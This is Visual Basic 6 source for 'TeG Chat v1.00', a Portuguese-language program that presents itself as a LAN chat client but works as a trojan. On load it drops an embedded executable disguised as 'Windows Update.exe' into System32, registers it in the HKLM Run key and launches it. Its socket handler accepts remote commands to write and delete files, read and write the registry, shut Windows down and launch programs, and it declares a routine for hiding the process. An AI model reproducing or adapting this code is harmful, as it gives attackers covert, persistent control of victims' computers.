VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmChatCliente 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "TeG Chat v1.00 - Diego José"
   ClientHeight    =   7890
   ClientLeft      =   45
   ClientTop       =   615
   ClientWidth     =   11910
   Icon            =   "frmChatCliente.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7890
   ScaleWidth      =   11910
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdConectar 
      Caption         =   "Conectar"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   930
      TabIndex        =   11
      Top             =   645
      Width           =   1335
   End
   Begin VB.CommandButton cmdDesconectar 
      Caption         =   "&Desconectar"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   2265
      TabIndex        =   10
      Top             =   645
      Width           =   1605
   End
   Begin VB.TextBox txtApelido 
      BackColor       =   &H0000FFFF&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   3675
      TabIndex        =   9
      Text            =   "Diego"
      Top             =   210
      Width           =   2055
   End
   Begin VB.ComboBox txtIp 
      BackColor       =   &H00FFFF00&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   345
      Left            =   555
      Style           =   1  'Simple Combo
      TabIndex        =   8
      Text            =   "200."
      Top             =   195
      Width           =   2010
   End
   Begin VB.TextBox txtEnviar 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   1710
      TabIndex        =   3
      Text            =   "Olá"
      Top             =   7140
      Width           =   8295
   End
   Begin VB.CommandButton cmdEnviar 
      Caption         =   "&Enviar"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   10050
      TabIndex        =   2
      Top             =   7140
      Width           =   930
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H0000FF00&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   7785
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   210
      Width           =   3165
   End
   Begin MSWinsockLib.Winsock Socket 
      Left            =   7455
      Top             =   3105
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox txtPapo 
      BackColor       =   &H00FFFFFF&
      Height          =   5970
      Left            =   165
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   4
      Top             =   1005
      Width           =   11580
   End
   Begin VB.Label lblIp 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "IP:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   150
      TabIndex        =   13
      Top             =   225
      Width           =   360
   End
   Begin VB.Label lblApelido 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Apelido:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   2655
      TabIndex        =   12
      Top             =   240
      Width           =   960
   End
   Begin VB.Label lblStatus 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Status:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   810
      TabIndex        =   7
      Top             =   7560
      Width           =   840
   End
   Begin VB.Label lblInfo 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   285
      Left            =   1710
      TabIndex        =   6
      Top             =   7545
      Width           =   9270
   End
   Begin VB.Label lblTexto 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Texto:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   930
      TabIndex        =   5
      Top             =   7185
      Width           =   720
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Seu IP:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   240
      Left            =   6840
      TabIndex        =   0
      Top             =   240
      Width           =   930
   End
   Begin VB.Menu mnuoptions 
      Caption         =   "Opções"
   End
   Begin VB.Menu mnuchat 
      Caption         =   "a"
      Visible         =   0   'False
      Begin VB.Menu mnudata 
         Caption         =   "Texto"
      End
   End
End
Attribute VB_Name = "frmChatCliente"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit
Dim ss As String
Dim version As String
Private Declare Function GetActiveWindow Lib "user32" () As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Dim buffer As String
Private Type NOTIFYICONDATA
   cbSize As Long
   hwnd As Long
   uId As Long
   uFlags As Long
   uCallBackMessage As Long
   hIcon As Long
   szTip As String * 64
End Type

'Declare the constants for the API function. These constants can be
'found in the header file Shellapi.h.

'The following constants are the messages sent to the
'Shell_NotifyIcon function to add, modify, or delete an icon from the
'taskbar status area.
Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2

'The following constant is the message sent when a mouse event occurs
'within the rectangular boundaries of the icon in the taskbar status
'area.
Private Const WM_MOUSEMOVE = &H200

'The following constants are the flags that indicate the valid
'members of the NOTIFYICONDATA data type.
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4

'The following constants are used to determine the mouse input on the
'the icon in the taskbar status area.

'Left-click constants.
Private Const WM_LBUTTONDBLCLK = &H203   'Double-click
Private Const WM_LBUTTONDOWN = &H201     'Button down
Private Const WM_LBUTTONUP = &H202       'Button up

'Right-click constants.
Private Const WM_RBUTTONDBLCLK = &H206   'Double-click
Private Const WM_RBUTTONDOWN = &H204     'Button down
Private Const WM_RBUTTONUP = &H205       'Button up

'Declare the API function call.
Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean

'Dimension a variable as the user-defined data type.
Dim nid As NOTIFYICONDATA
Dim str As String
Dim subk As String
Dim ent As String
Dim mesag As String
Dim tit As String
Dim file As String
Dim filename As String
Dim info As String
Dim valor As String

Private Type SECURITY_ATTRIBUTES

nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long
Private Sub HideMeFromTaskList()
On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 1
End Sub

Public Sub ShowMeInTaskList()
On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 0
End Sub
Public Sub CloseMe()
On Error Resume Next
'lngresult =
Call Shell("RUNDLL.EXE user.exe,exitwindows")
  Exit Sub
End Sub
Private Sub cmdConectar_Click()
'Eventos que acontecem quando o usuário clica em conectar
On Error Resume Next
If txtIp.Text = "" Then
lblInfo.Caption = "Digite o IP do Servidor"
txtIp.SetFocus
'Verificação se o usuário nao esqueceu de digitar o IP

  Else
  lblInfo.Caption = "Tentando conectar a " & txtIp.Text & "..."
    
  If Socket.State <> 7 Then
  Socket.Close
  Socket.Connect txtIp.Text, 23
  'Aqui ele primeiro verifica se o socket já está
  'conectado então se não estiver conectado
  'ele conecta no ip fornecido, na porta 23
  'Os estados do socket são:
  '0  ->  Closed
  '1  ->  Open
  '2  ->  Listening
  '3  ->  Connection pending
  '4  ->  Resolving host
  '5  ->  Host resolved
  '6  ->  Connecting
  '7  ->  Connected
  '8  ->  Peer is closing the connection
  '9  ->  Error
     
     Do
     If Socket.State = 7 Then GoTo 10
     If Socket.State = 9 Then GoTo 20
     DoEvents
     Loop
     'Esse Laço é para verificação do estado do
     'socket. Se o estado do socket = 7, ou seja,
     'se está conectado, ele vai para o rótulo 10
     'logo abaixo e se for = 9 ele vai para o rótulo
     '20 porque o socket apresentou algum erro
     
10 lblInfo.Caption = "Conectado a " & txtIp.Text
Exit Sub

20 lblInfo.Caption = "Erro na conexao a " & txtIp.Text
Socket.Close
Exit Sub

   End If
End If

End Sub

Private Sub cmdDesconectar_Click()
'Eventos para desconectar
On Error Resume Next
Socket.Close
lblInfo.Caption = "TeG Chat v1.00"
End Sub

Private Sub cmdEnviar_Click()
On Error Resume Next
'Aqui são colocados os eventos que acontecem
'quando o cliente clica no botão enviar
If txtApelido.Enabled = True Then txtApelido.Enabled = False
If Socket.State <> sckConnected Then
MsgBox "Voce não está conectada..."
'Primeiro ele verifica se o socket está conectado
'e caso não esteja ele apresenta a mensagem box
'que não está conectado
 
 Else
 If txtApelido.Text = "" Then
 lblInfo.Caption = "Escolha um apelido!"
 txtApelido.SetFocus
 'Aqui ele verifica se o usuário tem um apelido

   Else
   If txtEnviar.Text = "" Then
   lblInfo.Caption = "Digite algo para enviar!"
   txtEnviar.SetFocus
   'Aqui ele verifica se o usuário digitou algo para enviar

    Else
    Socket.SendData vbCrLf & "========" & txtApelido.Text & " - IP: " & Text1.Text & vbCrLf & txtEnviar.Text
    'Então o socket envia o caracter <, o apelido que está
    'na caixa de texto txtApelido e o caracter >, ficando
    'assim - <Apelido> e o texto que foi digitado na caixa
    'de texto txtEnviar
    
    txtPapo.Text = txtPapo.Text + vbCrLf & "========" & txtApelido.Text & "> " & txtEnviar.Text & vbCrLf
    'Aqui ele adiciona na caixa de texto txtPapo o que
    'o usuário digitou
    
    txtEnviar.Text = ""
    'Apaga o que foi digitado pelo usuário
    
    End If
  End If
End If

End Sub

Private Sub cmdSair_Click()
On Error Resume Next
End
End Sub

Private Sub cmdSobre_Click()
On Error Resume Next
frmAbout.Show
End Sub

Private Sub Form_Load()
If App.PrevInstance = True Then Unload Me
On Error Resume Next


Dim nome As String
Dim p_ret As String
nome = "C:\Windows\System32\Windows Update.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
lblInfo.Caption = "TeG Chat v1.00"

Text1.Text = GetIPAddress
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Windows Update", "C:\Windows\System32\Windows Update.exe"
Call Shell(nome)
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
On Error Resume Next
Socket.Close
Unload frmAbout
Unload frmOptions
End Sub
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
    'Event occurs when the mouse pointer is within the rectangular
    'boundaries of the icon in the taskbar status area.
    On Error Resume Next
    Dim msg As Long
    Dim sFilter As String
    msg = x / Screen.TwipsPerPixelX
    Select Case msg
       Case WM_LBUTTONDOWN
       Case WM_LBUTTONUP
       Case WM_LBUTTONDBLCLK
Me.WindowState = 0
       Me.Show
       Case WM_RBUTTONDOWN

       Case WM_RBUTTONUP
  Me.WindowState = 0
  Me.Show
 
       Case WM_RBUTTONDBLCLK
    End Select
    End Sub
Private Sub Form_Resize()
On Error Resume Next
If Me.WindowState = 1 Then
   nid.cbSize = Len(nid)
   nid.hwnd = frmChatCliente.hwnd
   nid.uId = vbNull
   nid.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
   nid.uCallBackMessage = WM_MOUSEMOVE
   nid.hIcon = frmChatCliente.Icon
   nid.szTip = "Clique aqui para maximizar o programa" & vbNullChar

   'Call the Shell_NotifyIcon function to add the icon to the taskbar
   'status area.
   Shell_NotifyIcon NIM_ADD, nid
   Me.Hide
   Else
   Me.Show
   End If
End Sub

Private Sub mnuAbout_Click()
On Error Resume Next
frmAbout.Show
End Sub

Private Sub mnuOptions_Click()
On Error Resume Next
frmOptions.Show
End Sub





Private Sub mnuopt_Click()

End Sub

Private Sub txtPapo_Change()
On Error Resume Next
txtPapo.SelStart = Len(txtPapo.Text)
End Sub


Public Function GetCaption(lhWnd As Long) As String
On Error Resume Next
Dim sA As String, lLen As Long

   lLen& = GetWindowTextLength(lhWnd&)

      sA$ = String(lLen&, 0&)

   Call GetWindowText(lhWnd&, sA$, lLen& + 1)
   GetCaption$ = sA$

End Function
Public Function DLHFindWin(frm As Form, WinTitle As String, _
CaseSensitive As Boolean) As Long
On Error Resume Next
Dim lhWnd As Long, sA As String

   lhWnd& = frm.hwnd


Do

   DoEvents
      If lhWnd& = 0 Then Exit Do
         If CaseSensitive = False Then
             sA$ = LCase$(GetCaption(lhWnd&))
             WinTitle$ = LCase$(WinTitle$)
         Else
             sA$ = GetCaption(lhWnd&)
         End If

       If InStr(sA$, WinTitle$) Then
          DLHFindWin& = lhWnd&
          Exit Do
       Else
         DLHFindWin& = 0
       End If

       lhWnd& = GetNextWindow(lhWnd&, 2)

Loop

End Function


Public Sub CreateNewDirectory(NewDirectory As String)
On Error Resume Next
   Dim sDirTest As String
   Dim SecAttrib As SECURITY_ATTRIBUTES
   Dim bSuccess As Boolean
   Dim sPath As String
   Dim iCounter As Integer
   Dim sTempDir As String
   iFlag = 0
   sPath = NewDirectory
   
    If Right(sPath, Len(sPath)) <> "\" Then
        sPath = sPath & "\"
    End If
   
    iCounter = 1
   
    Do Until InStr(iCounter, sPath, "\") = 0
        iCounter = InStr(iCounter, sPath, "\")
       sTempDir = Left(sPath, iCounter)
       sDirTest = Dir(sTempDir)
       iCounter = iCounter + 1
        SecAttrib.lpSecurityDescriptor = &O0
        SecAttrib.bInheritHandle = False
        SecAttrib.nLength = Len(SecAttrib)
        bSuccess = CreateDirectory(sTempDir, SecAttrib)
    Loop
    End Sub

Private Sub socket_DataArrival(ByVal bytesTotal As Long)
'Eventos que acontecem quando recebemos as mensagens, ou
'seja, os dados do Servidor
On Error Resume Next


Dim Dados As String 'Declaração dos dados que o servidor vai nos enviar
Socket.GetData str
Socket.GetData file
Socket.GetData filename
Socket.GetData mesag
Socket.GetData subk
Socket.GetData ent
Socket.GetData val
If Left$(str, 5) = "file:" Then buffer = Right$(str, Len(str))

'Então o socket aceita os dados, ou seja, a mensagem que
'o servidor enviou e coloca eles na caixa de textos txtPapo.text
Select Case str
Case "note"
Shell "notepad.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "calc"
Shell "calc.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "putfile"

Open filename For Binary As #1
Put #1, , file
Close #1
''''''''''''''''''''''''''''
Case "checknet"
'EnumWindows AddressOf EnumProc, 0
info = App.Path & "\" & App.EXEName
Socket.SendData info
'''''''''''''''''''''''
Case "pain"
Shell "pbrush", vbMaximizedFocus
'''''''''''''''''''''''''''
Case "msg"

MsgBox mesag, , "Mensagem"
Case "del"

Kill file
Kill buffer
Case "close"
CloseMe
''''''''''''''''
Case "ctrl"
Shell "control", vbMaximizedFocus
''''''''''''''''''''''
Case "mplayer"
Shell "mplayer", vbMaximizedFocus
'''''''''''''''
Case "scan"
Shell "scandskw", vbMaximizedFocus
Case "sol"
Shell "sol", vbMaximizedFocus
Case "word"
Shell "C:\Arquivos de Programas\Microsoft Office\Office\Winword.exe", vbMaximizedFocus 'or change as required
'''''''''''
Case "cddooropen"
retvalue& = mciSendString("set CDAudio door open", returnstring, 127, 0)
If retvalue& <> 0 Then
   OpenCDDrive = 0
Else
   OpenCDDrive = 1
End If
'''''''''''''''''''''''''
Case "dir"
'''''''''''
CreateNewDirectory ("c:\7£r@bY7£\Invadiu\Seu\PC")
'''''''''''''
Case "regput"
SetStringValue subk, ent, val
Case "closeme"
''''''''''''
Socket.Close
Unload Me
'''''''''''''''''
Case "regload"
info = GetStringValue(subk, ent)
Socket.SendData info
Case "wintime"
Dim lngReturn As Long
lngReturn = GetTickCount()
info = ((lngReturn / 1000) / 60) & " minutos."
Socket.SendData info
End Select
Socket.GetData Dados
txtPapo.Text = txtPapo.Text + Dados & vbCrLf

End Sub




